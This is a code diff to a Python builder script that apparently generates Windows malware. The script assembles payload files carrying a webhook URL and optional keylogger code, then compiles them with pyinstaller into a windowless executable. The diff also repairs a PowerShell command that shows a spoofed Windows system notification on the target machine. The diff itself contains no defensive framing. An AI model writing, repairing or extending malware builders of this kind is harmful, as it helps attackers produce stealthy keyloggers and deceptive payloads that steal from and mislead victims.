@@ -175,7 +175,6 @@ while True:
               options_file.write(f"<===== OPTION FOR {file_name} =====> \n \nWebhook url : {webhook_url} \n \n")
               for option in options_choosed:
                 options_file.write(option + "\n")
-              os.system(f"pyinstaller --noconfirm --onefile --noconsole --{file_name}.py")
             print(GREEN + "txt file successfully created ! \n")
           else:
             print("")
@@ -187,6 +186,8 @@ while True:
             if keylogger == True:
               build_file.write(keylogger_options)
           print(GREEN + f"{file_name}.py successfully created ! \n \n")
+          print(f"Compiling {file_name}.py to exe...")
+          os.system(f"pyinstaller --noconfirm --onefile --windowed {file_name}.py")
           options.clear()
           options_choosed.clear()
           keylogger = False
@@ -356,22 +357,12 @@ while True:
           notification_message = input("Notification message >>> ")
           print(notification_message)
           fake_system_notification = f"""
-os.system('''powershell -Command "Add-Type -AssemblyName System.Windows.Forms; '
-          '$notifyIcon = New-Object System.Windows.Forms.NotifyIcon; '
-          '$notifyIcon.Icon = [System.Drawing.SystemIcons]::Information; '
-          '$notifyIcon.BalloonTipTitle = \'{notification_title}\'; '
-          '$notifyIcon.BalloonTipText = \'{notification_message}\'; '
-          '$notifyIcon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info; '
-          '$notifyIcon.Visible = $true; '
-          '$notifyIcon.ShowBalloonTip(3000); '
-          '[System.Media.SystemSounds]::Asterisk.Play(); '
-          '$notifyIcon.Dispose();"''')
- """
-          fake_system_notification_choice = f"Fake syste notification : Title : {notification_title}, Message : {notification_message}"
+os.system(f'''powershell -Command "Add-Type -AssemblyName 'System.Windows.Forms'; Add-Type -AssemblyName 'System.Drawing'; $notifyIcon = New-Object System.Windows.Forms.NotifyIcon; $notifyIcon.Icon = [System.Drawing.SystemIcons]::Information; $notifyIcon.BalloonTipTitle = '{notification_title}'; $notifyIcon.BalloonTipText = '{notification_message}'; $notifyIcon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info; $notifyIcon.Visible = $true; $notifyIcon.ShowBalloonTip(3000); [System.Media.SystemSounds]::Asterisk.Play(); $notifyIcon.Dispose();"''')"""
+          fake_system_notification_choice = f"Fake system notification : Title : {notification_title}, Message : {notification_message}"
           options.append(fake_system_notification)
           options_choosed.append(fake_system_notification_choice)
           clear.clear()
-          print(GREEN + "Fake system notificartion successfully added to the options !")
+          print(GREEN + "Fake system notification successfully added to the options !")
           time.sleep(2)
         elif choice in ["7", "07"]:
           clear.clear()
